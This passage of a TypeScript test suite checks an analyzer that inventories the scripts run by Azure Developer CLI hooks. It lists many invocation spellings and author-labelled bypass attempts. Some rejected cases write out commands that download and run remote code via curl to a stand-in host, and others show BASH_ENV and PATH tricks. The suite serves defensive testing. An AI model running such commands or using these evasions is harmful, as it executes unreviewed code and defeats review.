import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { AzdBindingError, analyzeHookText, inspectAzdBicepProject, type AzdBindingErrorCode } from "../index.js";

const SUBSCRIPTION = "11111111-2222-3333-4444-555555555555";
const TENANT = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";

type Shell = "sh" | "pwsh";
interface Scenario {
  readonly name: string;
  readonly run: string;
  readonly files?: Record<string, string>;
  readonly shell?: Shell;
}
interface Accepted extends Scenario {
  /** Every project file the hook executes, in any order. */
  readonly expect: readonly string[];
}
interface Rejected extends Scenario {
  readonly code: AzdBindingErrorCode;
}

async function project(scenario: Scenario): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "apex-azd-hooks-"));
  const files: Record<string, string> = {
    "azure.yaml": `name: demo\nhooks:\n  preprovision:\n    run: ${JSON.stringify(scenario.run)}\n    shell: ${scenario.shell ?? "sh"}\n`,
    "infra/main.bicep": "param x string = 'a'\n",
    "infra/bicepconfig.json": "{}\n",
    ".azure/lab/.env": `AZURE_ENV_NAME="lab"\nAZURE_SUBSCRIPTION_ID="${SUBSCRIPTION}"\nAZURE_LOCATION="swedencentral"\n`,
    ...scenario.files,
  };
  for (const [path, content] of Object.entries(files)) {
    await mkdir(dirname(join(root, path)), { recursive: true });
    await writeFile(join(root, path), content, "utf8");
  }
  return root;
}

async function bind(scenario: Scenario) {
  const root = await project(scenario);
  try {
    return await inspectAzdBicepProject({
      projectId: "demo",
      runId: "run-1",
      projectRoot: root,
      environmentName: "lab",
      azdVersion: "1.35.1",
      target: { subscriptionId: SUBSCRIPTION, location: "swedencentral", tenantId: TENANT },
      extensionDigests: {},
    });
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

const touch = (file: string): string => (/\.(?:cmd|bat)$/iu.test(file) ? "\nrem changed\n" : "\n# changed\n");
const sh = "echo ok\n";
const ps = "Write-Host ok\n";
const cmd = "@echo off\r\necho ok\r\n";
const on = (...names: string[]): Record<string, string> =>
  Object.fromEntries(
    names.map((name) => [name, /\.ps1$|\.psm1$/u.test(name) ? ps : /\.cmd$|\.bat$/u.test(name) ? cmd : sh]),
  );

const accepted: Accepted[] = [
  // Round 2 of my own bypass attempts that are accepted with a complete inventory.
  { name: "round 2: time", run: "time bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "round 2: coproc", run: "coproc bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  {
    name: "round 2: pipe-ampersand",
    run: "bash hooks/a.sh |& tee out.txt",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  { name: "round 2: timeout", run: "timeout 5 bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "round 2: nice", run: "nice -n 5 bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "round 2: setsid", run: "setsid bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "round 2: stdbuf", run: "stdbuf -o0 bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "round 2: command -p", run: "command -p bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  {
    name: "round 2: comment hash inside word",
    run: "echo hi#x; bash hooks/a.sh",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "round 2: commented command is not a load",
    run: "echo ok # bash hooks/b.sh\nbash hooks/a.sh",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "round 2: quoted heredoc body is text",
    run: "cat <<'EOF'\n$(bash hooks/b.sh)\nEOF\nbash hooks/a.sh",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "round 2: double-quoted substitution",
    run: 'echo "$(bash hooks/a.sh)"',
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "round 2: process substitution",
    run: "diff <(bash hooks/a.sh) /dev/null",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "round 2: nested inline shells",
    run: "sh -c 'sh -c \"sh hooks/a.sh\"'",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "round 2: ps assignment runs the script",
    shell: "pwsh",
    run: "$x = .\\hooks\\a.ps1",
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  {
    name: "round 2: ps invoke-command file",
    shell: "pwsh",
    run: "Invoke-Command -FilePath .\\hooks\\a.ps1",
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  {
    name: "round 2: ps icm script block",
    shell: "pwsh",
    run: "icm -ScriptBlock { .\\hooks\\a.ps1 }",
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  {
    name: "round 2: ps saps",
    shell: "pwsh",
    run: "saps pwsh '-File hooks\\a.ps1'",
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  {
    name: "benign writes",
    run: "echo x > .tmp/out.txt; echo y >&2; az account show > /dev/null 2>&1; bash hooks/a.sh",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "write outside the project",
    run: "cp hooks/a.sh /tmp/copy.sh; bash hooks/a.sh",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "ps benign write",
    shell: "pwsh",
    run: "'x' | Out-File .tmp/out.txt; .\\hooks\\a.ps1",
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  // Interpreter paths, wrappers and case.
  { name: "absolute sh", run: "/bin/sh hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "env sh", run: "/usr/bin/env sh hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "exec absolute sh", run: "exec /bin/sh hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  {
    name: "sudo absolute bash",
    run: "sudo /bin/bash hooks/pre.sh",
    files: on("hooks/pre.sh"),
    expect: ["hooks/pre.sh"],
  },
  {
    name: "upper-case interpreter path",
    run: "/BIN/SH hooks/pre.sh",
    files: on("hooks/pre.sh"),
    expect: ["hooks/pre.sh"],
  },
  { name: "bash.exe", run: "bash.exe hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "time", run: "time bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "nohup background", run: "nohup bash hooks/a.sh &", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "command", run: "command bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "env assignment", run: "env FOO=1 bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "assignment prefix", run: "FOO=1 BAR=2 bash -e hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "timeout", run: "timeout 10 bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "xargs", run: "echo x | xargs bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "find -exec", run: "find . -exec bash hooks/a.sh {} \\;", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "su -c", run: "su -c 'sh hooks/a.sh' root", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "busybox sh", run: "busybox sh hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "exec with options", run: "exec -a name bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  // Several command positions.
  {
    name: "and-list",
    run: "bash hooks/first.sh && bash hooks/second.sh",
    files: on("hooks/first.sh", "hooks/second.sh"),
    expect: ["hooks/first.sh", "hooks/second.sh"],
  },
  {
    name: "dot list",
    run: ". ./hooks/first.sh ; . ./hooks/second.sh",
    files: on("hooks/first.sh", "hooks/second.sh"),
    expect: ["hooks/first.sh", "hooks/second.sh"],
  },
  {
    name: "pipeline and or-list",
    run: "true | bash hooks/first.sh || bash hooks/second.sh",
    files: on("hooks/first.sh", "hooks/second.sh"),
    expect: ["hooks/first.sh", "hooks/second.sh"],
  },
  {
    name: "no spaces around operators",
    run: "bash ./hooks/a.sh;bash ./hooks/b.sh&&./hooks/c.sh",
    files: on("hooks/a.sh", "hooks/b.sh", "hooks/c.sh"),
    expect: ["hooks/a.sh", "hooks/b.sh", "hooks/c.sh"],
  },
  {
    name: "if else",
    run: "if true; then bash hooks/a.sh; else bash hooks/b.sh; fi",
    files: on("hooks/a.sh", "hooks/b.sh"),
    expect: ["hooks/a.sh", "hooks/b.sh"],
  },
  {
    name: "group and subshell",
    run: "{ bash hooks/a.sh; }\n(bash hooks/b.sh)",
    files: on("hooks/a.sh", "hooks/b.sh"),
    expect: ["hooks/a.sh", "hooks/b.sh"],
  },
  {
    name: "for loop",
    run: 'for f in a b; do bash hooks/a.sh "$f"; done',
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "while loop with redirect",
    run: "while read l; do ./hooks/a.sh; done < list.txt",
    files: { ...on("hooks/a.sh"), "list.txt": "a\n" },
    expect: ["hooks/a.sh"],
  },
  { name: "test then run", run: "[ -f x ] && bash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  {
    name: "pipe into loop",
    run: "echo x | while read l; do ./hooks/x.sh; done",
    files: on("hooks/x.sh"),
    expect: ["hooks/x.sh"],
  },
  {
    name: "stderr redirect",
    run: "bash hooks/pre.sh 2>&1 | tee log",
    files: on("hooks/pre.sh"),
    expect: ["hooks/pre.sh"],
  },
  {
    name: "trailing comment",
    run: "bash hooks/a.sh # bash hooks/ghost.sh",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  { name: "string data", run: 'echo "bash hooks/ghost.sh"', files: {}, expect: [] },
  { name: "cd after the load", run: "bash hooks/a.sh; cd hooks", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "absolute cd without loads", run: "echo hi && cd /tmp", files: {}, expect: [] },
  { name: "find with glob", run: "find . -name '*.sh' -exec chmod +x {} \\;", files: {}, expect: [] },
  // Path spellings.
  { name: "bare script token", run: "hooks/second.sh", files: on("hooks/second.sh"), expect: ["hooks/second.sh"] },
  {
    name: "dot-slash command with argument",
    run: "./hooks/second.sh arg",
    files: on("hooks/second.sh"),
    expect: ["hooks/second.sh"],
  },
  {
    name: "command after echo",
    run: "echo start; ./hooks/second.sh",
    files: on("hooks/second.sh"),
    expect: ["hooks/second.sh"],
  },
  { name: "command substitution", run: "echo $(./hooks/x.sh)", files: on("hooks/x.sh"), expect: ["hooks/x.sh"] },
  { name: "backtick substitution", run: "echo `./hooks/x.sh`", files: on("hooks/x.sh"), expect: ["hooks/x.sh"] },
  { name: "quoted substitution", run: 'echo "$(./hooks/x.sh)"', files: on("hooks/x.sh"), expect: ["hooks/x.sh"] },
  {
    name: "process substitution",
    run: "diff <(bash hooks/a.sh) <(bash hooks/b.sh)",
    files: on("hooks/a.sh", "hooks/b.sh"),
    expect: ["hooks/a.sh", "hooks/b.sh"],
  },
  {
    name: "output process substitution",
    run: "echo x > >(bash hooks/a.sh)",
    files: on("hooks/a.sh"),
    expect: ["hooks/a.sh"],
  },
  {
    name: "assignment substitution",
    run: "X=$(bash hooks/a.sh)\nexport Y=$(./hooks/b.sh)",
    files: on("hooks/a.sh", "hooks/b.sh"),
    expect: ["hooks/a.sh", "hooks/b.sh"],
  },
  { name: "double quoted path", run: 'bash "hooks/pre.sh"', files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "single quoted path", run: "bash 'hooks/pre.sh'", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "escaped path", run: "bash hooks/\\pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "split quotes", run: 'bash hoo""ks/pre.sh', files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "quoted interpreter", run: "'bash' hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "spliced interpreter", run: "b'a'sh hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "escaped interpreter", run: "\\bash hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "flags", run: "bash -ex -o pipefail -- hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "line continuation", run: "bash \\\n hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  {
    name: "CRLF lines",
    run: "bash hooks/a.sh\r\nbash hooks/b.sh\r\n",
    files: on("hooks/a.sh", "hooks/b.sh"),
    expect: ["hooks/a.sh", "hooks/b.sh"],
  },
  {
    name: "CRLF script",
    run: "bash hooks/pre.sh",
    files: { "hooks/pre.sh": ". ./hooks/lib.sh\r\n", "hooks/lib.sh": sh },
    expect: ["hooks/pre.sh", "hooks/lib.sh"],
  },
  // Inline code, here-documents, redirects and traps.
  { name: "bash -c", run: "bash -c 'bash hooks/a.sh'", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "sh -c source", run: 'sh -c "source ./hooks/lib.sh"', files: on("hooks/lib.sh"), expect: ["hooks/lib.sh"] },
  {
    name: "quoted here-document run by bash",
    run: "bash <<'EOF'\n. ./hooks/lib.sh\nEOF\n",
    files: on("hooks/lib.sh"),
    expect: ["hooks/lib.sh"],
  },
  {
    name: "expanding here-document",
    run: "cat <<EOF\n$(./hooks/x.sh)\nEOF\n",
    files: on("hooks/x.sh"),
    expect: ["hooks/x.sh"],
  },
  { name: "stdin redirect", run: "bash < hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  { name: "compact stdin redirect", run: "bash<hooks/pre.sh", files: on("hooks/pre.sh"), expect: ["hooks/pre.sh"] },
  {
    name: "rcfile",
    run: "bash --rcfile ./hooks/rc.sh ./hooks/main.sh",
    files: on("hooks/rc.sh", "hooks/main.sh"),
    expect: ["hooks/main.sh", "hooks/rc.sh"],
  },
  // Own bypass attempts: command lines passed as one string to wrappers and other shells.
  { name: "env -S", run: "env -S 'bash hooks/a.sh'", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "watch string", run: "watch 'bash hooks/a.sh'", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "parallel string", run: "parallel 'bash hooks/a.sh' ::: x", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "sudo -s string", run: "sudo -s 'bash hooks/a.sh'", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "ssh string", run: "ssh host 'bash hooks/a.sh'", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "script -c", run: "script -c 'bash hooks/a.sh' /dev/null", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "busybox ash", run: "busybox ash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "dash", run: "dash hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "ksh", run: "ksh ./hooks/a.sh", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  {
    name: "ps start-process argument string",
    shell: "pwsh",
    run: 'Start-Process -FilePath pwsh -ArgumentList "-File hooks\\a.ps1"',
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  {
    name: "ps start-process argument list",
    shell: "pwsh",
    run: "Start-Process cmd -ArgumentList '/c','hooks\\a.cmd'",
    files: on("hooks/a.cmd"),
    expect: ["hooks/a.cmd"],
  },
  { name: "trap", run: "trap 'bash hooks/a.sh' EXIT", files: on("hooks/a.sh"), expect: ["hooks/a.sh"] },
  { name: "builtin source", run: "builtin source ./hooks/lib.sh", files: on("hooks/lib.sh"), expect: ["hooks/lib.sh"] },
  { name: "command source", run: "command . ./hooks/lib.sh", files: on("hooks/lib.sh"), expect: ["hooks/lib.sh"] },
  // Nested files and name collisions.
  {
    name: "nested chain",
    run: "bash hooks/pre.sh",
    files: {
      "hooks/pre.sh": ". ./hooks/lib.sh\nbash hooks/deep.sh\n",
      "hooks/lib.sh": "./hooks/lib2.sh\n",
      "hooks/lib2.sh": sh,
      "hooks/deep.sh": sh,
    },
    expect: ["hooks/pre.sh", "hooks/lib.sh", "hooks/lib2.sh", "hooks/deep.sh"],
  },
  {
    name: "same file name at root",
    run: ". ./lib.sh",
    files: { "lib.sh": sh, "hooks/lib.sh": sh },
    expect: ["lib.sh"],
  },
  {
    name: "same file name in hooks",
    run: ". hooks/lib.sh",
    files: { "lib.sh": sh, "hooks/lib.sh": sh },
    expect: ["hooks/lib.sh"],
  },
  { name: "python script", run: "python hooks/x.py", files: { "hooks/x.py": "print('x')\n" }, expect: ["hooks/x.py"] },
  // PowerShell.
  {
    name: "ps script",
    shell: "pwsh",
    run: ".\\hooks\\second.ps1",
    files: on("hooks/second.ps1"),
    expect: ["hooks/second.ps1"],
  },
  {
    name: "ps call operator",
    shell: "pwsh",
    run: "& .\\hooks\\second.ps1",
    files: on("hooks/second.ps1"),
    expect: ["hooks/second.ps1"],
  },
  {
    name: "ps quoted call operator",
    shell: "pwsh",
    run: '& ".\\hooks\\second.ps1" -Arg 1',
    files: on("hooks/second.ps1"),
    expect: ["hooks/second.ps1"],
  },
  {
    name: "ps -File",
    shell: "pwsh",
    run: "pwsh -File hooks\\x.ps1",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps flags",
    shell: "pwsh",
    run: "powershell -NoProfile -ExecutionPolicy Bypass -File hooks\\x.ps1",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps upper-case exe",
    shell: "pwsh",
    run: "PWSH.EXE -file hooks/x.ps1",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps absolute backslash exe",
    shell: "pwsh",
    run: '& "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -File hooks\\x.ps1',
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps absolute slash exe",
    shell: "pwsh",
    run: '& "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe" -File hooks/x.ps1',
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "posix absolute slash powershell",
    run: "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -File hooks/x.ps1",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "posix quoted backslash powershell",
    run: '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NoProfile -File "hooks\\x.ps1"',
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps dot-source",
    shell: "pwsh",
    run: ". .\\hooks\\lib.ps1",
    files: on("hooks/lib.ps1"),
    expect: ["hooks/lib.ps1"],
  },
  {
    name: "ps import path",
    shell: "pwsh",
    run: "Import-Module .\\hooks\\mod.psm1\nImport-Module Az.Accounts",
    files: on("hooks/mod.psm1"),
    expect: ["hooks/mod.psm1"],
  },
  {
    name: "ps using module",
    shell: "pwsh",
    run: "using module .\\hooks\\mod.psm1",
    files: on("hooks/mod.psm1"),
    expect: ["hooks/mod.psm1"],
  },
  {
    name: "ps Start-Process",
    shell: "pwsh",
    run: "Start-Process pwsh -ArgumentList '-File','hooks\\x.ps1'",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps Invoke-Command",
    shell: "pwsh",
    run: "Invoke-Command -FilePath .\\hooks\\x.ps1",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps script block",
    shell: "pwsh",
    run: "& { .\\hooks\\x.ps1 }",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps subexpression",
    shell: "pwsh",
    run: "Write-Host $(.\\hooks\\x.ps1)",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps if else",
    shell: "pwsh",
    run: "if ($true) { .\\hooks\\a.ps1 } else { .\\hooks\\b.ps1 }",
    files: on("hooks/a.ps1", "hooks/b.ps1"),
    expect: ["hooks/a.ps1", "hooks/b.ps1"],
  },
  {
    name: "ps pipeline block",
    shell: "pwsh",
    run: "Get-Content .\\hooks\\data.txt | ForEach-Object { .\\hooks\\x.ps1 $_ }",
    files: { ...on("hooks/x.ps1"), "hooks/data.txt": "a\n" },
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps foreach",
    shell: "pwsh",
    run: "foreach ($f in 'a') { .\\hooks\\x.ps1 }",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps backtick continuation",
    shell: "pwsh",
    run: "pwsh `\n -File hooks\\x.ps1",
    files: on("hooks/x.ps1"),
    expect: ["hooks/x.ps1"],
  },
  {
    name: "ps statements",
    shell: "pwsh",
    run: ".\\hooks\\a.ps1; .\\hooks\\b.ps1 && .\\hooks\\c.ps1",
    files: on("hooks/a.ps1", "hooks/b.ps1", "hooks/c.ps1"),
    expect: ["hooks/a.ps1", "hooks/b.ps1", "hooks/c.ps1"],
  },
  {
    name: "ps block comment",
    shell: "pwsh",
    run: "<# .\\hooks\\ghost.ps1 #> .\\hooks\\a.ps1",
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  { name: "ps string data", shell: "pwsh", run: "Write-Host '.\\hooks\\ghost.ps1'", files: {}, expect: [] },
  { name: "ps here-string data", shell: "pwsh", run: "Write-Host @'\n.\\hooks\\ghost.ps1\n'@", files: {}, expect: [] },
  {
    name: "ps CRLF",
    shell: "pwsh",
    run: "pwsh -File hooks\\x.ps1\r\n.\\hooks\\y.ps1\r\n",
    files: on("hooks/x.ps1", "hooks/y.ps1"),
    expect: ["hooks/x.ps1", "hooks/y.ps1"],
  },
  {
    name: "ps script file",
    shell: "pwsh",
    run: "hooks/pre.ps1",
    files: { "hooks/pre.ps1": ". .\\hooks\\lib.ps1\n", "hooks/lib.ps1": ps },
    expect: ["hooks/pre.ps1", "hooks/lib.ps1"],
  },
  {
    name: "ps -Command",
    shell: "pwsh",
    run: 'pwsh -Command ". .\\hooks\\lib.ps1"',
    files: on("hooks/lib.ps1"),
    expect: ["hooks/lib.ps1"],
  },
  {
    name: "ps Set-Location after the load",
    shell: "pwsh",
    run: ".\\hooks\\a.ps1; Set-Location hooks",
    files: on("hooks/a.ps1"),
    expect: ["hooks/a.ps1"],
  },
  // cmd, reached from a PowerShell hook or from a script.
  {
    name: "cmd /c script",
    shell: "pwsh",
    run: "cmd /c hooks\\second.cmd",
    files: on("hooks/second.cmd"),
    expect: ["hooks/second.cmd"],
  },
  {
    name: "cmd.exe quoted call",
    shell: "pwsh",
    run: 'cmd.exe /c "call hooks\\x.cmd"',
    files: on("hooks/x.cmd"),
    expect: ["hooks/x.cmd"],
  },
  {
    name: "posix quoted cmd",
    run: 'cmd /c "hooks\\second.cmd"',
    files: on("hooks/second.cmd"),
    expect: ["hooks/second.cmd"],
  },
  {
    name: "cmd path command",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "hooks\\second.cmd\r\n", "hooks/second.cmd": cmd },
    expect: ["hooks/pre.cmd", "hooks/second.cmd"],
  },
  {
    name: "cmd call",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "call hooks\\x.cmd\r\ncall hooks/y.cmd\r\n", "hooks/x.cmd": cmd, "hooks/y.cmd": cmd },
    expect: ["hooks/pre.cmd", "hooks/x.cmd", "hooks/y.cmd"],
  },
  {
    name: "cmd bare name",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "second\r\n", "second.cmd": cmd },
    expect: ["hooks/pre.cmd", "second.cmd"],
  },
  {
    name: "cmd if exist",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "if exist hooks\\x.cmd call hooks\\x.cmd\r\n", "hooks/x.cmd": cmd },
    expect: ["hooks/pre.cmd", "hooks/x.cmd"],
  },
  {
    name: "cmd for",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "for %%f in (a b) do call hooks\\x.cmd %%f\r\n", "hooks/x.cmd": cmd },
    expect: ["hooks/pre.cmd", "hooks/x.cmd"],
  },
  {
    name: "cmd labels",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": "@echo off\r\nsetlocal\r\ncall :label\r\n:label\r\necho hi\r\n" },
    expect: ["hooks/pre.cmd"],
  },
  {
    name: "cmd start",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: { "hooks/pre.cmd": 'start /wait "title" hooks\\x.cmd\r\n', "hooks/x.cmd": cmd },
    expect: ["hooks/pre.cmd", "hooks/x.cmd"],
  },
  {
    name: "cmd operators",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: {
      "hooks/pre.cmd": "hooks\\a.cmd & hooks\\b.cmd && hooks\\c.cmd || hooks\\d.cmd\r\n",
      ...on("hooks/a.cmd", "hooks/b.cmd", "hooks/c.cmd", "hooks/d.cmd"),
    },
    expect: ["hooks/pre.cmd", "hooks/a.cmd", "hooks/b.cmd", "hooks/c.cmd", "hooks/d.cmd"],
  },
  {
    name: "cmd nested interpreters",
    shell: "pwsh",
    run: "cmd /c hooks\\pre.cmd",
    files: {
      "hooks/pre.cmd": "cmd /c hooks\\x.cmd\r\npowershell -File hooks\\x.ps1\r\n",
      ...on("hooks/x.cmd", "hooks/x.ps1"),
    },
    expect: ["hooks/pre.cmd", "hooks/x.cmd", "hooks/x.ps1"],
  },
];

const rejected: Rejected[] = [
  // Round 2 of my own bypass attempts that must fail closed.
  {
    name: "round 2: dollar-quote path",
    run: "bash $'hooks/a.sh'",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "round 2: brace expansion",
    run: "bash hooks/{a,b}.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "round 2: glob", run: "bash hooks/a?.sh", files: on("hooks/a1.sh"), code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "round 2: tilde", run: "bash ~/a.sh", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "round 2: variable command",
    run: "B=bash; $B hooks/a.sh",
    files: on("hooks/a.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "round 2: download in process substitution",
    run: "bash <(curl -s https://example.test/x)",
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "round 2: download in command substitution",
    run: 'sh -c "$(curl -fsSL https://example.test/x)"',
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "round 2: BASH_ENV via declare",
    run: "declare -x BASH_ENV=hooks/a.sh; bash hooks/b.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "round 2: PATH prefix", run: "PATH=hooks az x", code: "AZD_HOOK_UNBOUND_CONTENT" },
  { name: "round 2: docker run", run: "docker run -v $PWD:/w x bash /w/hooks/a.sh", code: "AZD_HOOK_SCRIPT_INVALID" },
  {
    name: "round 2: make",
    run: "make -f hooks/Makefile",
    files: on("hooks/Makefile"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "round 2: ps variable path", shell: "pwsh", run: "$PSScriptRoot\\a.ps1", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "round 2: ps call variable path",
    shell: "pwsh",
    run: '& "$PSScriptRoot\\a.ps1"',
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "round 2: ps cd then relative",
    shell: "pwsh",
    run: "cd hooks\n.\\a.ps1",
    files: on("hooks/a.ps1", "a.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "round 2: ps dotnet process",
    shell: "pwsh",
    run: "[System.Diagnostics.Process]::Start('pwsh','-File hooks\\a.ps1')",
    files: on("hooks/a.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  { name: "round 2: ps add-type", shell: "pwsh", run: "Add-Type -Path hooks\\a.dll", code: "AZD_HOOK_UNBOUND_CONTENT" },
  {
    name: "round 2: ps pipe to pwsh",
    shell: "pwsh",
    run: "Get-Content hooks\\a.ps1 | pwsh -",
    files: on("hooks/a.ps1"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
    name: "round 2: cmd cd then bare command",
    shell: "pwsh",
    run: 'cmd /c "cd hooks & build"',
    files: on("hooks/build.cmd"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  // Files a hook writes must not be files it, another hook or azd runs or reads.
  {
    name: "write: write then run",
    run: "echo 'bash hooks/a.sh' > hooks/b.sh; bash hooks/b.sh",
    files: on("hooks/a.sh", "hooks/b.sh"),
    code: "AZD_HOOK_UNBOUND_CONTENT",
  },
  {
